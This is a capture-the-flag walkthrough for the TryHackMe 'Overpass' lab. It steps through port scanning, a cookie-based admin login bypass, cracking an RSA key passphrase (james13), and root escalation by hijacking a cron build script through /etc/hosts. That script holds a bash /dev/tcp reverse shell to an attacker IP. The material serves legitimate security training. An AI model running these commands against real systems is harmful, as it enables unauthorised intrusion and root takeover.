# [Overpass](https://tryhackme.com/room/overpass)

## What happens when some broke CompSci students make a password manager?

# Overpass

## What happens when a group of broke Computer Science students try to make a password manager? Obviously a perfect commercial success!

### Hack the machine and get the flag in user.txt

1. Start by scanning the target machine to identify open ports and running services

```bash
nmap <TARGET_IP>
```

[SCREEN01]

2. Enumerate directories and files on the web server to discover hidden endpoints

```bash
gobuster dir -u http://<TARGET_IP> -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

[SCREEN02]

3. Navigate to `http://<TARGET_IP>/admin/` and examine the login functionality. View the page source and analyze `login.js`

```javascript
async function login() {
  const usernameBox = document.querySelector("#username");
  const passwordBox = document.querySelector("#password");
  const loginStatus = document.querySelector("#loginStatus");
  loginStatus.textContent = "";
  const creds = { username: usernameBox.value, password: passwordBox.value };
  const response = await postData("/api/login", creds);
  const statusOrCookie = await response.text();
  if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials";
    passwordBox.value = "";
  } else {
    Cookies.set("SessionToken", statusOrCookie);
    window.location = "/admin";
  }
}
```

4. Exploit the flawed authentication logic by manually setting a SessionToken cookie. Open browser developer tools (F12) and execute in the console

```javascript
Cookies.set("SessionToken", "");
```

[SCREEN04]

5. Refresh the `/admin/` page. This grants access to the admin panel, which contains James's RSA private key. The RSA key is password-protected. Extract and crack the password
   - The password is `james13`

```bash
chmod 600 rsa
/opt/john/ssh2john.py rsa > rsa.hash
john rsa.hash --wordlist=/root/Tools/wordlists/rockyou.txt
ssh -i rsa james@<TARGET_IP>
```

[SCREEN05]

6. Once logged in as james, locate and read the user flag

```bash
cat user.txt
```

[SCREEN06]

---

### Escalate your privileges and get the flag in root.txt

1. Examine the user's home directory for any interesting files. The todo.txt file hints at an automated build process that might be exploitable

```bash
cat todo.txt
```

```
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

2. Check for scheduled tasks that might run with elevated privileges

```bash
cat /etc/crontab
```

3. Create a malicious build script and set up listeners

```bash
mkdir -p downloads/src/
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > downloads/src/buildscript.sh
python -m SimpleHTTPServer 80
nc -lvnp 4444
```

4. Since we have write access to `/etc/hosts` as james, we can redirect `overpass.thm` to our attacking machine

```bash
nano /etc/hosts
cat /etc/hosts
```

[SCREEN07]

5. Once you receive the reverse shell connection, verify root access and retrieve the final flag

```bash
cat /root/root.txt
```
